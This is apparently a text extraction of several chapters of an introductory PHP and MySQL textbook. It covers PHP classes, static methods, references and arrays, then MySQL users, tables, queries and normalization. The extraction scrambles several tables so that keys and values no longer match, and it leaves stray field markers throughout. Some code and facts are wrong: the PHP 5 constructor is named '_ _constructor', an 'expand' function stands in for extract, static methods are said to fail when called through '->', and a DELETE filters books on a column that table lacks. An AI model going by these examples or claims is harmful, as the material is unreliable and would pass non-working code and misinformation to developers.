 work that initializes the class, such as setting up the values of variables in the class. 
 The constructor is defined by creating a method that has the same name as the 
 class, as shown in Example 5-11.
  
 Example 5-11. Creating the Cat constructor
  
 <?php 
  
 class Cat {
  
  // Constructor
  
  function Cat( ) {
  
  } 
  
 } 
  
 ?>
  
 PHP 5.0 supports syntax for creating a constructor method using
  _ _constructor
 , as 
 shown in Example 5-12. If a class in PHP 5.0 doesn’t have this method, the old style 
 of using the class name as the method name is used.
  
 Object-Oriented Programming
  
 |
  
 97",NA
Variable Scope Within Classes,"Classes may contain variables that help to define their structure and how they are 
 used. Variables inside a class are declared with the
  var
  statement. The
  var
  statement 
 declares a variable to have
  class scope
 . Class scope means they’re visible with any 
 methods of the class and can be referenced outside the class using a special 
 construct.
  
  
 PHP 5.0 supports new keywords for defining member variables 
 called 
 public
 ,
  private
 , and
  protected
 . These let you develop objects 
 along principles more like Java than like earlier PHP programming. If 
 you don’t use one of these keywords before your
  var
  statement (like
  
 private var
 ), the default is
  public
 .
  
 Object-Oriented Programming
  
 |
  
 99",NA
Inheritance,"When declaring classes, it’s also possible to separate functionality into subclasses 
 that automatically inherit the methods and variables of the class on which they are 
 based. This can be useful if you’re adding functionality to a class without modifying 
 the original class. Example 5-17 demonstrates how properties and methods are 
 inherited from the parent class for the
  Domestic_Cat
  class.
  
 The extends operator
  
 When a class inherits from another class, the class from which it inherits is called 
 the 
 superclass
 . When declaring a subclass, use the
  extends
  keyword to specify from 
 which class it’s inheriting. Example 5-17 shows an example of this.
  
 Example 5-17. Using the extends keyword to define a subclass
  
 <?php 
  
 class Cat {
  
  
  // How old the cat is
  
  
  var $age;
  
  function Cat($new_age){
  
  
  // Set the age of this cat to the new age
  
  
  $this->age = $new_age;
  
  }
  
  function Birthday( ){
  
  
  
  $this->age++;
  
  
  } 
  
 } 
  
 class Domestic_Cat extends Cat {
  
  
  // Constructor
  
  
  function Domestic_Cat( ) {
  
  
  }
  
  
  // Sleep like a domestic cat
  
  
  function sleep( ) {
  
  
  
  echo(""Zzzzzz.<br />"");
  
  
  } 
  
 } 
  
 $fluffy=new Domestic_Cat( ); 
  
 $fluffy->Birthday( ); 
  
 $fluffy->sleep( ); 
  
 echo ""Age is $fluffy->age <br />""; 
  
 ?>
  
 Object-Oriented Programming
  
 | 101",NA
Static Methods and Variables,"Methods and variables can also be used and accessed if they are defined as static in 
 a class. As Chapter 3 noted,
  static
  means the method or variable is accessible 
 through the class definition and not just through objects. In PHP 4.0, there is no 
 way to des-ignate a variable to be static; however, in PHP 5.0, you can use the
  static
  
 modifier.
  
 The
  ::
  operator allows you to refer to variables and methods on a class that doesn’t 
 yet have any instances or objects created for it. Example 5-20 shows how you can 
 call a static method using
  ::
 , and how the usual method-calling syntax of
  ->
  doesn’t 
 work, even after an instance of the class has been created. (PHP doesn’t report an 
 error—it just doesn’t work.)
  
 Example 5-20. Using the -> and :: operators to call hypnotize
  
 <?php
  
  class Cat {
  
  }
  
 class Hypnotic_Cat extends Cat {
  
  // Constructor
  
  function Hypnotic_Cat( ) {
  
  }
  
  // This function must be called statically
  
  public static function hypnotize( ) {
  
 echo (""The cat was hypnotized."");
  
  
  
  return;
  
  
  } 
  
 }
  
 // Hypnotize all cats 
  
 Hypnotic_Cat::hypnotize( );
  
 $hypnotic_cat = new Hypnotic_Cat( ); 
  
 // Does nothing 
  
 $hypnotic_cat->hypnotize( );
  
 The output is as follows:
  
 The cat was hypnotized.
  
 When a method is called using the scope resolution operator (
 ::
 ), you can’t use the 
 $this
  object to refer to the object because there is no object.
  
 104
  
 |
  
 Chapter 5: Functions",NA
Variable References,"In PHP, a variable name points to a location in memory that stores the data. There 
 can be more than one variable name pointing to the same spot in memory. The 
 ampersand operator (
 &
 ) is used to indicate that you’re interested in the location in 
 memory that a variable points to instead of its value.
  
 PHP references allow you to create two variables to refer to the same content. 
 There-fore, changing the value of one variable can change the value of another. This 
 can make it very difficult to find errors in your code, since changing one variable 
 also changes the other.
  
 The same syntax can be used with functions that return references. Example 5-21 
 uses this to reference the
  $some
  variable.
  
 Example 5-21. Referencing the $some_variable
  
 <?php 
  
 $some_variable = ""Hello World!""; 
  
 $some_reference = &$some_variable; 
  
 $some_reference = ""Guten Tag World!""; 
  
 echo $some_variable; 
  
 echo $some_reference; 
  
 ?>
  
 Example 5-21 outputs the following:
  
 Guten Tag World!Guten Tag World!
  
 Example 5-21 shows that a reference is set using the
  &
  operator and precedes the
  $
  
 in the existing variable. The variable
  $some_reference
  then refers to
  $some_variable
  
 (the memory location where
  ""Hello World!""
  resides).
  
 As discussed previously in this chapter, variable references are useful for passing a 
 variable by reference as a parameter to a function. This allows the function to mod-
 ify the variable in your main code instead of modifying a local copy that’s lost when 
 the function completes.
  
 Assigning a variable to another variable without using the reference operator 
 results in a copy of the variable being placed into a new location in memory. The 
 new vari-able can be changed without modifying the original variable. While this 
 takes more memory, it’s the way to go if you don’t want to change the original 
 variable’s value.
  
 Now that you’ve learned about functions and classes, you’re ready to start working 
 with more complex data, such as arrays. Arrays will be very useful when working 
 with data from a database because they can easily hold the data from a query.
  
 Object-Oriented Programming
  
 | 105",NA
Chapter 5 Questions,"Question 5-1 
  
  
 What’s wrong with this function call?
  
 <?php
  
 // define a function 
  
 function Response {
  
  
  echo ""Have a good day!<br /><br />""; 
  
 }
  
 // driving to work 
  
 echo ""Are you going to merge? <br />""; 
  
 Response;
  
 // at the office 
  
 echo ""I need a status report on all your projects in the next 10 minutes for 
  
 my management meeting.<br />""; 
  
 Response;
  
 // at the pub after work 
  
 echo ""Did Bill get everything he needed today? He was sure crabby!<br />""; 
  
 Response; 
  
 ?>
  
 Question 5-2 
  
 Define a function called
  toast
  that takes
  minutes
  as a parameter. The function 
 prints “done.”
  
 Question 5-3 
  
  
 Call the
  toast
  function with
  5
  as a parameter.
  
 Question 5-4 
  
  
 What’s the difference between using
  include( )
  and
  require( )
 ?
  
 Question 5-5 
  
  
 What is a function called when it is part of a class?
  
 See the “Chapter 5” section in the Appendix for the answers to these questions.
  
 106
  
 |
  
 Chapter 5: Functions",NA
CHAPTER 6,NA,NA
Arrays,"6
  
 Variables are great for storing a single piece of information, but what happens 
 when you need to store data for a whole set of information, such as the results of a 
 query? When this happens, use
  arrays
 . Arrays are a special kind of variable that 
 stores many pieces of data. Arrays allow you to access any of the values stored in 
 them individu-ally yet still copy and manipulate the array as a whole. Because they 
 are so useful, you’ll see arrays used frequently. PHP provides many functions for 
 performing com-mon array tasks such as counting, sorting, and looping through the 
 data.",NA
Array Fundamentals,"To work with arrays, you need to learn two new terms: elements and indexes. 
 Elements
  are the values that are stored in the array. Each element in the array is 
 refer-enced by an
  index
  that differentiates the element from any other unique 
 element in the array. The index value can be a number or a string, but it must be 
 unique. You can think of an array like a spreadsheet or a database that has only two 
 columns. The first column uniquely identifies the row in the spreadsheet, while the 
 second column contains a stored value.",NA
Associative Versus Numeric Indexed Arrays,"Numeric
  arrays use numbers as their indexes, while
  associative
  arrays use stings. 
 When using associative arrays, you must supply an index string each time you add 
 an element. Numeric arrays allow you to just add the element, and PHP automati-
 cally assigns the first free number, starting at 0. Both types of arrays allow you to 
 add new elements to the array one at a time. Associative arrays are nice for storing 
 config-uration data since their keys can have a meaningful name.
  
  
 Be careful: most people tend to start counting at 1, not 0. If you’re 
 not careful, you might end up being off by one when accessing your 
 array, which is called an
  off-by-one error
 . The last element in a 
 numeric array
  
 is accessed as the length of the array minus 1.
  
 107",NA
Creating an Array,"To create an array, you must specify the elements and index values. In Table 6-2, 
 we show a sample associative array that uses household objects and relates them 
 to strings that describe their shapes.
  
 Table 6-2. An associative array that relates objects to their shapes
  
 Key
  
  
 Value
  
 Soda 
 can 
  
 Notepad 
  
 Apple 
  
 Orange 
  
 Phone 
 book
  
 Cylind
 er 
  
 Rectan
 gle 
  
 Sphere 
  
 Sphere 
  
 Rectan
 gle
  
 The elements of an array can be anything, including strings, numbers, and even 
 other arrays. The key field must be a
  scalar
 . Scalar values are simple values such as 
 a num-ber, text, or Boolean value, not data that can have more than one value such 
 as an array or an object. The key field of an array must also be unique for each 
 element; otherwise you may overwrite the same value. Should you attempt to 
 assign a value using a key you specified already, the new value simply replaces the 
 old value.
  
 108
  
 |
  
 Chapter 6: Arrays",NA
Multidimensional Arrays,"While we’ve shown only arrays that hold simple values like strings so far, 
 remember that an array can also store another array as an element. 
 Multidimensional arrays exploit the fact that an array can have another array as an 
 element. Each set of keys and values represents a
  dimension
 . Multidimensional 
 arrays have a key and value set for each dimension. Don’t worry if that sounds 
 complicated; again, it’s really just an array inside of an array, like those Russian 
 matryoshka dolls that open up to contain yet another smaller doll.
  
 Expanding on your
  shapes
  array, we’ve created a new associative array called 
 $objects
  with keys that are the names of the objects. Each element of the
  $objects 
 array is another associative array containing the keys
  shape
 ,
  color
 , and
  material
  with 
 the associated values as the elements. Table 6-4 shows you what data is being 
 stored.
  
 Table 6-4. A multidimensional array that now stores shape, color, and material for each object
  
 First key
  
  
 Second key
  
 Value
  
 Soda can
  
 Shape
  
 Cylinder
  
 Notepad
  
 Color
  
 Red
  
 Material
  
 Metal
  
 Shape
  
 Rectangle
  
 Apple
  
 Color
  
 White
  
 Material
  
 Paper
  
 Shape
  
 Sphere
  
 Orange
  
 Color
  
 Red
  
 Material
  
 Fruit
  
 Shape
  
 Sphere
  
 Phonebook
  
 Color
  
 Orange
  
 Material
  
 Fruit
  
 Shape
  
 Rectangle
  
 Color
  
 Yellow
  
 Material
  
 Paper
  
 114
  
 |
  
 Chapter 6: Arrays",NA
Extracting Variables from an Array,"PHP provides a shortcut for placing elements in an array into variables in which the 
 variables have the same names as the keys. This works for associative arrays only, 
 unless you specify a prefix that we’ll talk about next. The
  extract
  function takes an 
 array as a parameter and creates the local variables, as shown in Example 6-9.
  
 Example 6-9. Using extract on an associative array
  
 <?php 
  
 $shapes = array('Sodacan' => 'Cylinder',
  
  
  'Notepad' => 'Rectangle',
  
  
  'Apple' => 'Sphere',
  
  
  'Orange' => 'Sphere',
  
  
  'Phonebook' => 'Rectangle');
  
 extract($shapes); 
  
 // $Sodacan, $Notepad, $Apple, $Orange, and $Phonebook are now set 
  
 echo $Apple; 
  
 echo ""<br />""; 
  
 echo $Notepad; 
  
 ?>
  
 Example 6-9 produces browser output like that shown in Figure 6-2.
  
  
 Figure 6-2. The values from the array now appear in their own variables
  
 Notice that the spaces were removed from the key values in the
  $shapes
  array. 
 Although they wouldn’t have caused an error, they also wouldn’t be accessible as 
 variables, since variable names can’t have spaces. You need to use underscores 
 instead of spaces in variable names. Also, if a variable already exists with the same 
 name as a key in the array you want to expand, its value is overwritten by the value 
 from the expanded array.
  
 To prevent overwriting a variable, the
  expand
  function can automatically place a 
 des-ignated string followed by an underscore character before the variable name. 
 An underscore is automatically used to separate the key name from the prefix in 
 the assigned variable names. It’s specified using this syntax:
  
 expand($
 array
 ,EXTR_PREFIX_ALL,""
 the prefix
 "");
  
 Array Fundamentals
  
 | 117",NA
Array Functions in PHP,"Although we’ve already discussed several array functions, such as
  count
 , there are 
 many more. Following are some of the most common ones that we haven’t dis-
 cussed yet; a full listing can be found by searching
  http://www.php.net
 .
  
 Reset(
 array
 ) 
  
 Takes an array as its argument and resets the pointer to the beginning of the 
 array. The
  pointer
  is how PHP keeps track of the current element in an array 
 when working with functions that can move around in arrays. The value of the 
 first element is also returned.
  
 Array_push(
 array,elements
 ) 
  
 Adds one or more elements to the end of an existing array. For example,
  array_ 
 push($shapes,""rock"",""paper"",""scissors"");
  adds those three elements to an array 
 called
  $shapes
 .
  
 Array Fundamentals
  
 | 119",NA
Chapter 6 Questions,"Question 6-1 
  
  
 Where is the first element in a numeric 
 array?
  
 Question 6-2 
  
  
 Create a numeric array called
  $months
  that contains the months of the 
 year.
  
 Question 6-3 
  
 Use
  array( )
  to create an associative array of months and the number of days in 
 each month.
  
 Question 6-4 
  
  
 Display the
  $months
  array.
  
 See the “Chapter 6” section in the Appendix for the answers to these questions.
  
 Chapter 6 Questions
  
 | 121",NA
CHAPTER 7,NA,NA
Working with MySQL ,"7
  
 It’s time to learn how to connect to the MySQL database using the client tools that 
 come with MySQL. You may also use a web-based tool called phpMyAdmin to mod-
 ify your database. We’ll also cover how to use SQL to create databases, users, and 
 tables, as well as how to modify existing objects in the database.",NA
MySQL Database,"MySQL has its own client interface, allowing you to move data around and change 
 database configuration. Note that you should use a password to log in. Assigning 
 database
  users
  allows you to limit access to tables based on the logged-in database 
 user. Each MySQL server can host many databases. A web application may use its 
 own proprietary database or a standard database like MySQL.
  
 You may have installed MySQL yourself or have access to it through your ISP. Most 
 ISPs that support PHP also provide a MySQL database for your use. Should you 
 have difficulty, check their support pages or contact them to determine connection 
 details.
  
 You’ll need to know the following:
  
 • The IP address of the database server
  
 • The name of the database
  
 • The username
  
 • The password
  
 If you’ve installed MySQL on your computer, you’ll be able to use the defaults from 
 the installation and the password you specified. This chapter looks at two ways to 
 communicate with MySQL: the command line and phpMyAdmin.
  
 122",NA
Accessing the Database from the Command Line,"One way of communicating with MySQL is through the MySQL command-line cli-
 ent. Depending on which operating system you’re using, you need to either open a 
 command shell for Windows (type
  cmd
  from the Run dialog, as shown in Figure 7-
 1) or open a terminal session in Mac OS X and Unix environments.
  
  
 Figure 7-1. Windows Run dialog
  
 Once you reach the command line, type
  mysql
 , and press Enter. The syntax for the 
 mysql
  command is:
  
 mysql -h
  hostname
  -u
  user
  –p
  
 The default username is
  root
  if you’ve installed MySQL on your own computer. You 
 can omit the hostname flag and value. Enter your password when MySQL displays 
 the “Enter password” prompt. If the password, username, and hostname are 
 correct, you’ll see a banner message like that shown in Figure 7-2.
  
  
 Figure 7-2. A successful login to MySQL
  
  
 On a brand-new MySQL install, the password is blank.
  
 Don’t let the MySQL command-line interface alarm you; it’s not difficult to use.
  
 MySQL Database
  
 | 123",NA
Managing the Database,"Now that you’re connected to the database, you can create users, databases, and 
 tables. You may not need to create a database or user account if you’re using a 
 MySQL server in a hosted environment, and they supplied you with a username and 
 database name.",NA
Creating Users,"To create users above and beyond the default privileged
  root
  user, issue the
  grant 
 command. The
  grant
  command uses this syntax:
  
 GRANT
  PRIVILEGES
  ON
  DATABASE.OBJECTS
  TO'
 username
 '@'
 hostname
 ' IDENTIFIED BY 
  
 '
 password
 ';
  
 For example:
  
 GRANT ALL PRIVILEGES ON *.* TO 'michele'@'localhost' IDENTIFIED BY 'secret';
  
 This creates the user
  michele
  who can access anything locally. To change to the 
 michele
  user, at the
  mysql
  command prompt, type:
  
 exit
  
 Then start MySQL from the command line with the new username and password. 
 The syntax for specifying the username and password when starting MySQL is:
  
 mysql -h
  hostname
  -u
  username
  -p
 password
  
 Notice that there is no space between
  –p
  and
  password
 . MySQL can prompt for the 
 password if you just specify the
  –p
  flag without a password. If you don’t want users 
 to access tables other than their own, replace
  *
  in the
  GRANT ALL PRIVILEGES ON *.* 
 TO 'michele'
  code with the name of the user’s database, like this:
  
 GRANT ALL PRIVILEGES ON store.* TO 'michele'@'localhost' IDENTIFIED BY 'secret';
  
 You’ll need to run this line as
  root
  or as someone with permission. In this code, the 
 word
  store
  correlates to the database name where privileges are assigned, which 
 you’ll create in the next section.
  
 Managing the Database
  
 | 125",NA
Creating a MySQL Database,"You’re going to create a database called
  store
 . The
  CREATE DATABASE
  command 
 works like this:
  
 CREATE DATABASE store;
  
 If this works, you’ll get a result like this one:
  
 Query OK, 1 row affected (0.03 sec)
  
  
 Database names cannot contain any spaces. On Unix servers, such as 
 Linux and Mac OS X, database names are also case-sensitive.
  
 To start using this database, type:
  
 USE store;
  
 You will get the result:
  
 Database changed.
  
 Assuming you’ve done everything correctly, you’ll be set up with new data, and it 
 will be selected for use. Creating tables to hold data is an important concept, so 
 that’s where we’re headed!",NA
Using phpMyAdmin,"The tool phpMyAdmin, available from
  http://www.phpmyadmin.net/
 , allows you to 
 administer a MySQL database through your web browser. All that’s required is a 
 web server with PHP installed and a MySQL database to administer.
  
 To install phpMyAdmin, follow these steps:
  
 1. Click Downloads from the main page.
  
 2. Download the archive file, such as
  all-languages.tar.gz
  (Unix archived) or
  all-
 languages.zip
  (Windows ZIP format).
  
 3. Unpack the archive (including subdirectories) to a directory on your computer.
  
 4. Transfer them to your ISP account where PHP files can be executed. Or, if you 
 have a web server installed locally, transfer them to a directory in the 
 document root with a logical name such as
  myadmin
 .
  
 5. To configure phpMyAdmin, create a directory called
  config
  within the
  myadmin 
 directory. On Linux systems, execute these commands instead to create the 
 directory, and set the permissions to allow the setup program to modify the 
 con-figuration file:
  
 126
  
 |
  
 Chapter 7: Working with MySQL",NA
Database Concepts,"Databases are a repository for information. They excel at managing and manipulat-
 ing structured information.
  Structured information
  is a way to organize related 
 pieces of information, which we discussed previously in Chapters 3–6. The basic 
 types of structured information, which can also be called
  data structures
 , include:
  
 • Files
  
 • Lists
  
 • Arrays
  
 • Records
  
 • Trees
  
 • Tables
  
 Database Concepts
  
 | 131",NA
Structured Query Language,"Now that you’ve defined a table, you can add data to it. MySQL will keep track of all 
 the details. To manipulate data, use the Structured Query Language (SQL) com-
 mands. Because it’s been designed to easily describe the relationship between 
 tables and rows, the database uses SQL to modify data in tables.
  
 SQL is a standard language used with most databases such as MySQL, Oracle, or 
 Microsoft SQL Server. It was developed specifically as a language used to retrieve, 
 add, and manipulate data that resides in databases. We’ll get into the nitty-gritty of 
 MySQL in Chapter 8, but we’ll begin with some easy-to-use commands. We’re going 
 to start with creating tables.
  
 132
  
 |
  
 Chapter 7: Working with MySQL",NA
Creating Tables,"Use the
  create table
  command to specify the structure of new database tables. When 
 you create a database table, each column has a few options in addition to the 
 column names and data types. Values that must be supplied when adding data to a 
 table are specified using the
  NOT NULL
  keyword. The
  PRIMARY KEY
  keyword tells 
 MySQL which column to use as a key field. Then, you have MySQL automatically 
 assign key values using the
  AUTO_INCREMENT
  keyword.
  
 To create these tables, type or paste the code into the MySQL command-line client. 
 Chapter 8 contains important information if you’re interested in running the SQL 
 code in the following examples. It explains how to access the MySQL client, assign 
 security permissions using the
  GRANT
  command, create a database, and select it for 
 use.
  
 Example 7-1 creates the
  books
  table using the data types from Table 7-8.
  
 Example 7-1. Creating the books and authors tables
  
 CREATE TABLE books ( 
  
 title_id INT NOT NULL AUTO_INCREMENT, 
  
 title VARCHAR (150), 
  
 pages INT, 
  
 PRIMARY KEY (title_id));
  
 CREATE TABLE authors ( 
  
 author_id INT NOT NULL 
 AUTO_INCREMENT, 
  
 title_id INT NOT NULL, 
  
 author VARCHAR (125), 
  
 PRIMARY KEY (author_id));
  
 If everything is OK, you’ll see output that instructs MySQL to create a table 
 called“books,” and it’ll look like Example 7-2 (the time the query takes to run may 
 be dif-ferent than 0.06 sec):
  
 Example 7-2. Creating Sample Data
  
 mysql> CREATE TABLE books (
  
  
  -> title_id INT NOT NULL AUTO_INCREMENT,
  
  
  -> title VARCHAR (150),
  
  
  -> pages INT,
  
  
  -> PRIMARY KEY (title_id)); 
  
 Query OK, 0 rows affected (0.06 sec)
  
 Structured Query Language
  
 | 133",NA
Adding Data to a Table,"The
  INSERT
  command is used to add data. Its syntax is
  INSERT INTO
  table
  COLUMNS 
 (
 [columns]
 ) VALUES (
 [values]
 );
 . This syntax displays which table data needs to be 
 added to, the columns, and a list of the values. If the columns aren’t specified, the 
 values must be in the same order in which they were defined when the table was 
 cre-ated (as long as you don’t skip any column values). There are specific rules for 
 how you handle data to populate your database using SQL commands:
  
 • Numeric values shouldn’t be quoted.
  
 • String values should always be quoted.
  
 • Date and time values should always be quoted.
  
 • Functions shouldn’t be quoted.
  
 •
  NULL
  should never be quoted.
  
 Lastly, if a column isn’t given a value, it’s automatically considered
  NULL
  unless a 
 default exists for the column. If a column can’t have
  NULL
  (it was created with
  NOT 
 NULL
 ) and you don’t specify a value, an error occurs.
  
 For example:
  
 INSERT INTO books VALUES (1,""Linux in a Nutshell"",112); 
  
 INSERT INTO authors VALUES (NULL,1,""Ellen Siever""); 
  
 INSERT INTO authors VALUES (NULL,1,""Aaron Weber"");
  
 As long as there were no errors, you should get:
  
 mysql> INSERT INTO books VALUES (1,""Linux in a Nutshell"",112); 
  
 Query OK, 1 row affected (0.00 sec)
  
 mysql> INSERT INTO authors VALUES (NULL,1,""Ellen Siever""); 
  
 Query OK, 1 row affected (0.00 sec)
  
 mysql> INSERT INTO authors VALUES (NULL,1,""Aaron Weber""); 
  
 Query OK, 1 row affected (0.00 sec)
  
 When adding data, you must specify all the columns even if you aren’t supplying a 
 value for each one. Even though we didn’t supply the
  author_id
  field and we let 
 MySQL assign it for us, we still had to leave a placeholder for it.
  
 Likewise, we add the other book:
  
 INSERT INTO books VALUES (2,""Classic Shell Scripting"",256); 
  
 INSERT INTO authors VALUES (NULL,2,""Arnold Robbins""); 
  
 INSERT INTO authors VALUES (NULL,2,""Nelson Beebe"");
  
 Structured Query Language
  
 | 135",NA
Table Definition Manipulation,"Once you’ve created a table and started storing information in it, you may find that 
 you need to make a change to the column types. For example, you may find that a 
 field you thought would need only 30 characters actually needs 100. You could 
 start all over and redefine the table, but you’d lose all your data. Thankfully, MySQL 
 allows you to modify column types without losing your data. These examples 
 assume that you’ve created the database tables in this chapter.
  
 Renaming a table
  
 To rename a table, use
  ALTER TABLE
  table
  RENAME
  newtable
 . In this example, we are 
 renaming the table from
  books
  to
  publications
 :
  
 ALTER TABLE books RENAME publications;
  
 This would look like Figure 7-10.
  
  
 Figure 7-10. Renaming a table
  
 Changing a column’s data type
  
 To change a column data type, use
  ALTER TABLE
  table
  MODIFY
  column datatype
 . The 
 fol-lowing syntax modifies the
  author
  field so that the column can take 150 
 characters:
  
 ALTER TABLE authors MODIFY author VARCHAR(150);
  
 Changing a column’s data type will look like Figure 7-11.
  
  
 Figure 7-11. Changing a column’s data type
  
 136
  
 |
  
 Chapter 7: Working with MySQL",NA
Querying the Database,"Having data in tables doesn’t do much good if you can’t view what’s in them. The 
 SELECT
  command specifies which table(s) to query and which row(s) to view based 
 on specific conditions. The syntax of
  SELECT
  is
  SELECT
  columns
  FROM
  tables
  [WHERE 
 CLAUSE
 ];[ORDER BY CLAUSE];
 .
  
 Columns indicate a list of columns to display from the selected tables. The
  WHERE 
 clause optionally restricts which rows are selected.
  WHERE
  provides limits to the 
 results that are returned from a query. For example, rows can be rejected if a field 
 doesn’t equal a literal value or is less than or greater than a value. The
  ORDER BY
  
 clause allows you to sort the returned information in desired ways. Fields from 
 multiple tables can be forced to be equal. If multiple tables are included in a
  SELECT
  
 statement without a
  WHERE
  clause, the resulting set becomes the
  Cartesian
  
 product, in which every row in the first table is returned with all rows in the second 
 table, followed by the same thing for the second row in the first table. To put it 
 another way, that’s a lot of results!
  
 The simplest query is to view all columns in a table by using the asterisk (
 *
 ) 
 character:
  
 138
  
 |
  
 Chapter 7: Working with MySQL",NA
Modifying Database Data,"If you make a mistake, say, by entering the wrong number of pages for a book, you 
 can change the data by using the
  UPDATE
  command. There are many other reasons 
 to update a table, such as a user changing his password.
  
 UPDATE
  uses the same
  WHERE
  clause as the
  SELECT
  statement, but it adds a
  SET
  com-
 mand that specifies a new column value.
  
  
 If you forget to select the
  WHERE
  clause for an update, it changes 
 every record in the table.
  
 142
  
 |
  
 Chapter 7: Working with MySQL",NA
Deleting Database Data,"The
  DELETE
  command is used to delete rows or records in a table. It takes the same 
 WHERE
  clause as
  UPDATE
  but deletes any rows that match. Without the
  WHERE
  
 clause, you’d have an “oops!” moment because all the records in the table would be 
 deleted.
  
  
 You should really have a backup of your data when you are using 
 DELETE
 ; otherwise, all data could be lost, and you may be very 
 unhappy.
  
 In this example, only Ellen Siever’s book is deleted from the database:
  
 DELETE FROM books WHERE author_id = 1;",NA
Search Functions,"As you have seen in the previous examples, MySQL has the ability to find specific 
 search data. However, we have not covered the general search syntax. The percent-
 age (
 %
 ) character in MySQL is the wildcard character and is used with the
  LIKE
  key-
 word. That is, it can literally represent anything. This is like a Windows Explorer 
 search where searching for
  *.doc
  matches any document that ends with
  .doc
 . 
 Searches are case-insensitive by default.
  
 For example, to do a general search, you would use the following syntax:
  
 SELECT * FROM authors WHERE author LIKE ""%b%"";
  
 Structured Query Language
  
 | 143",NA
Logical Operators,"The same logical operators that we discussed with PHP’s conditional logic can also 
 be used in the
  WHERE
  clause.
  
 You can use
  AND
 ,
  OR
 , and
  NOT
  in your query’s
  WHERE
  clause:
  
 SELECT * FROM authors WHERE NOT (author = ""Ellen Siever"" );
  
 This returns all records where Ellen Siever is not the author. The parentheses relate 
 the
  NOT
  operator to the author comparison but are not required in this query.
  
 This query returns book and author information from the following code:
  
 SELECT *
  
  FROM books, authors
  
  WHERE title = ""Linux in a Nutshell""
  
   
  AND author = ""Aaron Weber""
  
   
  AND books.title_id = authors.title_id;
  
 This query returns all records with author names of either Aaron Weber or Ellen 
 Siever:
  
 SELECT *
  
  FROM books, authors
  
  WHERE (author = ""Aaron Weber""
  
    
  OR  author = ""Ellen Siever"")
  
   
  AND books.title_id=authors.title_id
  
 144
  
 |
  
 Chapter 7: Working with MySQL",NA
Chapter 7 Questions,"Question 7-1 
  
 What command is used to access MySQL from the command line (assuming the 
 MySQL bin directory is included in your path)?
  
 Question 7-2 
  
 Create a table called
  months
  that contains the month name and the number of 
 days in the month.
  
 Question 7-3 
  
  
 Write
  insert
  statements to populate the months and days.
  
 Question 7-4 
  
  
 Write a
  select
  statement to display the months.
  
 Question 7-5 
  
  
 Write a
  select
  statement to display the month that has only 28 days.
  
 Question 7-6 
  
  
 Write a query to display only the months that end in “ber.”
  
 See the “Chapter 7” section in the Appendix for the answers to these questions.
  
 Chapter 7 Questions
  
 | 145",NA
CHAPTER 8,NA,NA
Database Best Practices ,"8
  
 Now that you have MySQL up and running and have created a database, let’s talk 
 about database design and backing up your databases. As you know, backing up 
 your data is important. Adding MySQL to PHP and combining the applications for 
 your dynamic web site is a great start. But it helps tremendously to structure your 
 database correctly. If you have security, data integrity, and backups, you have the 
 most crucial pieces of a database. We’ll discuss security in Chapter 15.",NA
Database Design,"Designing your database properly is critical to your application performing well. 
 Just as putting the printer all the way across your office is inefficient, placing data in 
 poor relationships makes work less efficient because your database server will 
 waste time looking for data. When thinking about your database, think about what 
 kinds of questions will be asked when your database is used. For example, what are 
 the details about a product for sale? Or, is this a valid username and password?",NA
Relational Databases,"MySQL is a
  relational
  database. An important feature of relational systems is that 
 data can be spread across several tables, as opposed to our flat-file phone book 
 example. Related data is stored in separate tables and allows you to put them 
 together by using a key common to both tables. The
  key
  is the relation between the 
 tables. The selection of a
  primary key
  is one of the most critical decisions you’ll 
 make in designing a new database.
  
 The most important concept that you need to understand is that you must ensure 
 that the selected key is unique. If it’s possible that two records (past, present, or 
 future) share the same value for an attribute, don’t use that attribute as a primary 
 key. Including key fields from another table to form a link between tables is called a 
 foreign key
  relationship, like a boss to employees or a user to a purchase.
  
 146",NA
Relationship Types,"Databases relationships are quantified with the following categories:
  
 • One-to-one relationships
  
 • One-to-many relationships
  
 • Many-to-many relationships
  
 We’ll discuss each of these relationships and provide an example. If you think of a 
 family structure when thinking about relationships, you’re ahead of the game. 
 When you spend time alone with one parent, that’s a specific type of relationship; 
 when you spend time with both your parents, that’s another one. If you bring in a 
 signifi-cant partner and all of you—your parents, you, and your partner—do 
 something together, that’s another relationship. This is identical to the bucket 
 analogy. All those different types of relationships are like specific buckets that hold 
 the dynamics of your relationships. In the database world, this is the data you’ve 
 created.
  
 One-to-one relationships
  
 In a one-to-one relationship, each item is related to one and only one other item. 
 Within the example of an online bookstore, a one-to-one relationship exists 
 between users and their shipping addresses. Each user must have exactly one 
 shipping address. The key symbol in each figure represents the field that’s the key 
 for the table, as shown in Figure 8-1.
  
  
  
 users
  
 Relations
 hip 1–1
  
 ship
  
 Us
 er 
  
 Fir
 st 
  
 La
 st
  
 User 
  
 Addres
 s 
  
 City 
  
 State 
  
 Zip
  
  
 Figure 8-1. A one-to-one relationship between users and shipping addresses
  
 In Figure 8-2, you see that the user
  mdavis
  has one and only one address, as do the 
 users
  jphillips
  and
  sque
 .
  
 Database Design
  
 | 147",NA
Normalization,"Thinking about how your data is related and the most efficient way to organize it is 
 called
  normalization
 . Normalization of data is breaking it apart based on the logical 
 relationships to minimize the duplication of data. Generally, duplicated data wastes 
 space and makes maintenance a problem. Should you change information that is 
 duplicated, there’s the chance that you miss a portion and risk inconsistencies in 
 your database.
  
 Database Design
  
 | 149",NA
Forms of Normalization,"To normalize a database, start with the most basic rules of normalization and move 
 forward step by step. The steps of normalization are in three stages, called
  forms
 . 
 The first step, called First Normal Form (1NF or FNF), must be done before the sec-
 ond normal form. Likewise, the third normal form cannot be completed before the 
 second. The normalization process involves getting your data into conformity with 
 the three progressive normal forms.
  
 First Normal Form
  
 For your database to be in First Normal Form, it must satisfy three requirements. 
 No table may have repeating columns that contain the same kind of data, and all 
 col-umns must contain only one value. There must be a primary key that uniquely 
 defines rows. It can be one column or several columns, depending on how many 
 col-umns are needed to uniquely identify rows.
  
 150
  
 |
  
 Chapter 8: Database Best Practices",NA
Column Data Types,"Although databases store the same information that you collect and process in PHP, 
 databases require fields to be set to specific types of data when they’re created.
  
  
 Remember, PHP isn’t strongly typed, but most databases are!
  
 A
  data type
  is the classification of a particular type of information. When you read, 
 you’re used to conventions such as symbols, letters, and numbers. Therefore, it’s 
 easy to distinguish between different types of data because you use symbols along 
 with numbers and letters. You can tell at a glance whether a number is a 
 percentage, a time, or an amount of money. The symbols that help you to 
 understand a percent-age, time, or amount of money are that data’s type. A 
 database uses internal codes to keep track of the different types of data it 
 processes.
  
 Many programming languages require the programmer to declare the data type of 
 every data object, and most database systems require the user to specify the type of 
 each data field. The available data types vary from one programming language to 
 another, and from one database application to another. But the three main types of 
